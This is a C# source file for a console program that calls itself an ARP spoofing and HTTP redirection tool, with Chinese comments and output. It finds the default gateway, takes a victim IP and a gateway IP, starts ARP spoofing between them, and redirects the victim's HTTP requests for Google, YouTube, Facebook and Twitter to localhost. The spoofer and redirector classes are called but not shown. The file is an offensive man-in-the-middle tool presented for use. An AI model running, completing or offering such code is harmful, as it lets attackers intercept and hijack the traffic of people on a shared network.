using System.Net;
using System.Net.NetworkInformation;

namespace Rt
{
    public class Program
    {
        // 存储默认网关信息
        public static IPAddress? DefaultGateway { get; private set; }

        public static void Main(string[] args)
        {
            Console.WriteLine("ARP欺骗与HTTP重定向工具启动");

            try
            {
                // 获取默认网关
                Console.WriteLine("正在获取默认网关...");
                DefaultGateway = GetDefaultGateway();

                if (DefaultGateway == null)
                {
                    Console.WriteLine("未能获取默认网关，请检查网络连接");
                    return;
                }

                Console.WriteLine($"默认网关: {DefaultGateway}");

                // 验证网关可达
                Console.WriteLine($"正在验证网关 {DefaultGateway} 可达性...");
                if (!PingHost(DefaultGateway.ToString()))
                {
                    Console.WriteLine($"无法ping通网关 {DefaultGateway}，请检查网络连接");
                    return;
                }

                Console.WriteLine($"网关 {DefaultGateway} 可达");

                // 获取用户输入
                Console.Write($"请输入目标IP（直接回车使用默认值: 192.168.1.100）: ");
                string targetIpInput = Console.ReadLine() ?? "";
                IPAddress targetIp;

                if (string.IsNullOrWhiteSpace(targetIpInput))
                {
                    targetIp = IPAddress.Parse("192.168.1.100");
                    Console.WriteLine($"使用默认目标IP: {targetIp}");
                }
                else if (!IPAddress.TryParse(targetIpInput, out targetIp))
                {
                    Console.WriteLine($"无效的IP地址格式: {targetIpInput}");
                    return;
                }

                Console.Write($"请输入网关IP（直接回车使用自动检测的网关: {DefaultGateway}）: ");
                string gatewayIpInput = Console.ReadLine() ?? "";
                IPAddress gatewayIp;

                if (string.IsNullOrWhiteSpace(gatewayIpInput))
                {
                    gatewayIp = DefaultGateway;
                    Console.WriteLine($"使用自动检测的网关IP: {gatewayIp}");
                }
                else if (!IPAddress.TryParse(gatewayIpInput, out gatewayIp))
                {
                    Console.WriteLine($"无效的IP地址格式: {gatewayIpInput}");
                    return;
                }

                // 启动ARP欺骗
                Console.WriteLine("正在启动ARP欺骗...");
                ArpSpoofer.Start(targetIp, gatewayIp);
                Console.WriteLine("ARP欺骗已启动");

                // 设置HTTP重定向
                Console.WriteLine("正在设置HTTP重定向...");
                IPAddress localhost = IPAddress.Parse("127.0.0.1");
                var redirector = new Redirector(targetIp, localhost);

                // 添加关键字
                redirector.AddKeyword("google");
                redirector.AddKeyword("youtube");
                redirector.AddKeyword("facebook");
                redirector.AddKeyword("twitter");

                // 启动重定向
                redirector.Start();
                Console.WriteLine("HTTP重定向已启动");

                // 让程序一直运行
                Console.WriteLine("程序正在运行。按Ctrl+C退出...");
                while (true)
                {
                    Thread.Sleep(1000);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"程序发生错误: {ex.Message}");
            }
        }

        private static IPAddress? GetDefaultGateway()
        {
            try
            {
                Console.WriteLine("获取网络接口信息...");
                // 获取所有活动的网络接口
                var networkInterfaces = NetworkInterface.GetAllNetworkInterfaces()
                    .Where(n => n.OperationalStatus == OperationalStatus.Up)
                    .Where(n => n.NetworkInterfaceType != NetworkInterfaceType.Loopback)
                    .ToList();

                Console.WriteLine($"找到 {networkInterfaces.Count} 个活动网络接口");

                foreach (var networkInterface in networkInterfaces)
                {
                    Console.WriteLine($"检查网络接口: {networkInterface.Name}");
                    var gatewayAddresses = networkInterface.GetIPProperties().GatewayAddresses;

                    if (gatewayAddresses.Count > 0)
                    {
                        foreach (var gateway in gatewayAddresses)
                        {
                            if (gateway.Address != null &&
                                gateway.Address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                            {
                                Console.WriteLine($"找到IPv4网关: {gateway.Address}");
                                return gateway.Address;
                            }
                        }
                    }
                }

                Console.WriteLine("未找到默认网关");
                return null;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"获取默认网关时出错: {ex.Message}");
                return null;
            }
        }

        private static bool PingHost(string hostNameOrAddress)
        {
            try
            {
                using (var ping = new Ping())
                {
                    Console.WriteLine($"Ping {hostNameOrAddress}...");
                    PingReply reply = ping.Send(hostNameOrAddress);
                    bool pingable = reply.Status == IPStatus.Success;
                    Console.WriteLine($"Ping结果: {reply.Status}");
                    return pingable;
                }
            }
            catch (PingException)
            {
                Console.WriteLine($"Ping {hostNameOrAddress} 失败");
                return false;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Ping时发生异常: {ex.Message}");
                return false;
            }
        }
    }
}